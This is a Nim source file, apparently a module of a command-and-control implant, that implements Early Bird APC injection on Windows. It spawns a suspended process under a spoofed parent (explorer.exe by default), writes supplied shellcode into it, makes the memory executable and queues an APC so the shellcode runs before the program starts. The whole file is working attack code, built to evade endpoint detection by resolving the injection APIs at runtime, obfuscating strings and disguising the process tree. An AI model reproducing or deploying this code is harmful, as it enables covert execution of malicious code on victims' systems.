## earlybird — Early Bird APC injection (Windows only).
## Spawns a process suspended (with optional PPID spoofing), writes shellcode
## W^X (RW alloc -> write -> VirtualProtectEx RX), queues an APC on the main
## thread, then resumes. Shellcode executes before the process entry point.
##
## IAT evasion: VirtualAllocEx, WriteProcessMemory, VirtualProtectEx,
## QueueUserAPC are resolved at runtime via GetProcAddress — not in IAT.
## PPID spoofing: spawns under explorer.exe (or configured parent) using
## UpdateProcThreadAttribute so the process tree looks legitimate in EDR logs.
import std/[base64, json, strutils]
import core/types
import core/dynapi
import commands/registry
import crypto/strenc

when defined(windows):
  type
    DWORD     = uint32
    BOOL      = int32
    LPVOID    = pointer
    SIZE_T    = uint
    ULONG_PTR = uint
    WORD      = uint16

    STARTUPINFOA {.pure.} = object
      cb:              DWORD
      lpReserved:      cstring
      lpDesktop:       cstring
      lpTitle:         cstring
      dwX:             DWORD
      dwY:             DWORD
      dwXSize:         DWORD
      dwYSize:         DWORD
      dwXCountChars:   DWORD
      dwYCountChars:   DWORD
      dwFillAttribute: DWORD
      dwFlags:         DWORD
      wShowWindow:     WORD
      cbReserved2:     WORD
      lpReserved2:     ptr uint8
      hStdInput:       HANDLE
      hStdOutput:      HANDLE
      hStdError:       HANDLE

    STARTUPINFOEXA {.pure.} = object
      StartupInfo:     STARTUPINFOA
      lpAttributeList: pointer

    PROCESS_INFORMATION {.pure.} = object
      hProcess:    HANDLE
      hThread:     HANDLE
      dwProcessId: DWORD
      dwThreadId:  DWORD

    PROCESSENTRY32 {.pure.} = object
      dwSize:              DWORD
      cntUsage:            DWORD
      th32ProcessID:       DWORD
      th32DefaultHeapID:   uint
      th32ModuleID:        DWORD
      cntThreads:          DWORD
      th32ParentProcessID: DWORD
      pcPriClassBase:      int32
      dwFlags:             DWORD
      szExeFile:           array[260, char]

  const
    CREATE_SUSPENDED             = DWORD(0x00000004)
    EXTENDED_STARTUPINFO_PRESENT = DWORD(0x00080000)
    MEM_COMMIT                   = DWORD(0x00001000)
    MEM_RESERVE                  = DWORD(0x00002000)
    PAGE_READWRITE               = DWORD(0x04)
    PAGE_EXECUTE_READ            = DWORD(0x20)
    TH32CS_SNAPPROCESS           = DWORD(0x00000002)
    PROCESS_CREATE_PROCESS       = DWORD(0x0080)
    PROCESS_QUERY_INFORMATION    = DWORD(0x0400)
    INVALID_HANDLE_VALUE         = HANDLE(-1)
    PROC_THREAD_ATTR_PARENT      = uint(0x00020000)

  # --- Static imports: benign APIs ---
  proc CreateProcessA(
    lpApp: cstring, lpCmd: cstring, lpProcAttr: pointer, lpThrAttr: pointer,
    bInherit: BOOL, dwFlags: DWORD, lpEnv: pointer, lpCurDir: cstring,
    lpSI: ptr STARTUPINFOA, lpPI: ptr PROCESS_INFORMATION
  ): BOOL {.importc: "CreateProcessA", dynlib: "kernel32".}

  proc ResumeThread(h: HANDLE): DWORD
    {.importc: "ResumeThread", dynlib: "kernel32".}
  proc CloseHandle(h: HANDLE): BOOL
    {.importc: "CloseHandle", dynlib: "kernel32".}
  proc OpenProcess(da: DWORD, inherit: BOOL, pid: DWORD): HANDLE
    {.importc: "OpenProcess", dynlib: "kernel32".}
  proc CreateToolhelp32Snapshot(f: DWORD, pid: DWORD): HANDLE
    {.importc: "CreateToolhelp32Snapshot", dynlib: "kernel32".}
  proc Process32First(snap: HANDLE, pe: ptr PROCESSENTRY32): BOOL
    {.importc: "Process32First", dynlib: "kernel32".}
  proc Process32Next(snap: HANDLE, pe: ptr PROCESSENTRY32): BOOL
    {.importc: "Process32Next", dynlib: "kernel32".}

  proc InitializeProcThreadAttributeList(
    atl: pointer, attrCount: DWORD, flags: DWORD, sz: ptr SIZE_T
  ): BOOL {.importc: "InitializeProcThreadAttributeList", dynlib: "kernel32".}
  proc UpdateProcThreadAttribute(
    atl: pointer, flags: DWORD, attr: uint, val: pointer,
    sz: SIZE_T, prevVal: pointer, retSz: pointer
  ): BOOL {.importc: "UpdateProcThreadAttribute", dynlib: "kernel32".}
  proc DeleteProcThreadAttributeList(atl: pointer)
    {.importc: "DeleteProcThreadAttributeList", dynlib: "kernel32".}

  # --- Function pointer types: injection APIs (not in IAT) ---
  type
    FnVirtualAllocEx     = proc(h: HANDLE, a: LPVOID, sz: SIZE_T,
                                 t: DWORD, p: DWORD): LPVOID {.stdcall.}
    FnWriteProcessMemory = proc(h: HANDLE, a: LPVOID, buf: pointer,
                                 sz: SIZE_T, wr: ptr SIZE_T): BOOL {.stdcall.}
    FnVirtualProtectEx   = proc(h: HANDLE, a: LPVOID, sz: SIZE_T,
                                 prot: DWORD, old: ptr DWORD): BOOL {.stdcall.}
    FnQueueUserAPC       = proc(fn: LPVOID, thr: HANDLE,
                                 data: ULONG_PTR): DWORD {.stdcall.}

  var
    pVirtualAllocEx:     FnVirtualAllocEx     = nil
    pWriteProcessMemory: FnWriteProcessMemory  = nil
    pVirtualProtectEx:   FnVirtualProtectEx   = nil
    pQueueUserAPC:       FnQueueUserAPC       = nil
    ebApisLoaded = false

  proc loadEbApis() =
    if ebApisLoaded: return
    pVirtualAllocEx     = cast[FnVirtualAllocEx](resolveK32(hidstr("VirtualAllocEx")))
    pWriteProcessMemory = cast[FnWriteProcessMemory](resolveK32(hidstr("WriteProcessMemory")))
    pVirtualProtectEx   = cast[FnVirtualProtectEx](resolveK32(hidstr("VirtualProtectEx")))
    pQueueUserAPC       = cast[FnQueueUserAPC](resolveK32(hidstr("QueueUserAPC")))
    ebApisLoaded = true

  proc findPidByName(name: string): DWORD =
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, DWORD(0))
    if snap == INVALID_HANDLE_VALUE: return 0
    defer: discard CloseHandle(snap)
    var pe: PROCESSENTRY32
    pe.dwSize = DWORD(sizeof(PROCESSENTRY32))
    if Process32First(snap, addr pe) == 0: return 0
    while true:
      let exeName = $cast[cstring](addr pe.szExeFile[0])
      if exeName.toLowerAscii == name.toLowerAscii:
        return pe.th32ProcessID
      if Process32Next(snap, addr pe) == 0: break
    return 0

# ---------------------------------------------------------------------------

proc earlybirdExecute(taskId: string, params: JsonNode, state: AgentState,
                      send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: hidstr("earlybird is Windows-only"),
                      status: "error", completed: true)
  else:
    loadEbApis()

    if pVirtualAllocEx == nil or pWriteProcessMemory == nil or
       pVirtualProtectEx == nil or pQueueUserAPC == nil:
      return TaskResult(output: hidstr("Error: injection APIs not resolved"),
                        status: "error", completed: true)

    let processPath  = params{"process"}.getStr("")
    let shellcodeB64 = params{"shellcode"}.getStr("")
    let parentName   = params{"parent_process"}.getStr(hidstr("explorer.exe"))

    if processPath.len == 0:
      return TaskResult(output: hidstr("Error: process parameter required"),
                        status: "error", completed: true)
    if shellcodeB64.len == 0:
      return TaskResult(output: hidstr("Error: shellcode parameter required"),
                        status: "error", completed: true)

    var shellcode: seq[byte]
    try:
      let decoded = decode(shellcodeB64)
      shellcode = newSeq[byte](decoded.len)
      for i, c in decoded: shellcode[i] = byte(ord(c))
    except Exception as e:
      return TaskResult(output: hidstr("Error decoding shellcode: ") & e.msg,
                        status: "error", completed: true)

    if shellcode.len == 0:
      return TaskResult(output: hidstr("Error: empty shellcode after decode"),
                        status: "error", completed: true)

    # --- PPID spoofing: find and open desired parent process ---
    var hParent: HANDLE = 0
    var ppidOk = false
    if parentName.len > 0:
      let parentPid = findPidByName(parentName)
      if parentPid != 0:
        hParent = OpenProcess(PROCESS_CREATE_PROCESS or PROCESS_QUERY_INFORMATION,
                              BOOL(0), parentPid)
        ppidOk = (hParent != 0 and hParent != INVALID_HANDLE_VALUE)

    # Build PROC_THREAD_ATTRIBUTE_LIST
    var attrListSz: SIZE_T = 0
    discard InitializeProcThreadAttributeList(nil, 1, 0, addr attrListSz)
    let attrBuf = alloc(attrListSz)
    defer: dealloc(attrBuf)
    discard InitializeProcThreadAttributeList(attrBuf, 1, 0, addr attrListSz)
    defer: DeleteProcThreadAttributeList(attrBuf)

    if ppidOk:
      discard UpdateProcThreadAttribute(attrBuf, 0, PROC_THREAD_ATTR_PARENT,
                                        addr hParent, SIZE_T(sizeof(HANDLE)),
                                        nil, nil)

    # --- Spawn target process suspended ---
    var siex: STARTUPINFOEXA
    var pi:   PROCESS_INFORMATION
    siex.StartupInfo.cb = DWORD(sizeof(STARTUPINFOEXA))
    siex.lpAttributeList = if ppidOk: attrBuf else: nil

    let creationFlags = CREATE_SUSPENDED or
                        (if ppidOk: EXTENDED_STARTUPINFO_PRESENT else: DWORD(0))

    let created = CreateProcessA(
      nil, processPath.cstring, nil, nil, BOOL(0),
      creationFlags, nil, nil,
      cast[ptr STARTUPINFOA](addr siex), addr pi
    )
    if ppidOk: discard CloseHandle(hParent)

    if created == 0:
      return TaskResult(output: hidstr("Error: CreateProcessA failed"),
                        status: "error", completed: true)

    # --- W^X: RW alloc, write shellcode, flip to RX, queue APC ---
    let remoteMem = pVirtualAllocEx(pi.hProcess, nil, SIZE_T(shellcode.len),
                                    MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if remoteMem == nil:
      discard CloseHandle(pi.hThread)
      discard CloseHandle(pi.hProcess)
      return TaskResult(output: hidstr("Error: VirtualAllocEx failed"),
                        status: "error", completed: true)

    var bytesWritten: SIZE_T = 0
    if pWriteProcessMemory(pi.hProcess, remoteMem, addr shellcode[0],
                           SIZE_T(shellcode.len), addr bytesWritten) == 0:
      discard CloseHandle(pi.hThread)
      discard CloseHandle(pi.hProcess)
      return TaskResult(output: hidstr("Error: WriteProcessMemory failed"),
                        status: "error", completed: true)

    var oldProt: DWORD = 0
    if pVirtualProtectEx(pi.hProcess, remoteMem, SIZE_T(shellcode.len),
                         PAGE_EXECUTE_READ, addr oldProt) == 0:
      discard CloseHandle(pi.hThread)
      discard CloseHandle(pi.hProcess)
      return TaskResult(output: hidstr("Error: VirtualProtectEx failed"),
                        status: "error", completed: true)

    if pQueueUserAPC(remoteMem, pi.hThread, ULONG_PTR(0)) == 0:
      discard CloseHandle(pi.hThread)
      discard CloseHandle(pi.hProcess)
      return TaskResult(output: hidstr("Error: QueueUserAPC failed"),
                        status: "error", completed: true)

    discard ResumeThread(pi.hThread)
    discard CloseHandle(pi.hThread)
    discard CloseHandle(pi.hProcess)

    let ppidNote = if ppidOk: hidstr(" (PPID -> ") & parentName & hidstr(")")
                   else: ""
    return TaskResult(
      output:    hidstr("Injected ") & $shellcode.len &
                 hidstr(" bytes into PID ") & $pi.dwProcessId & ppidNote,
      status:    "success",
      completed: true,
    )

proc initEarlyBird*() =
  register(hidstr("earlybird"), earlybirdExecute)
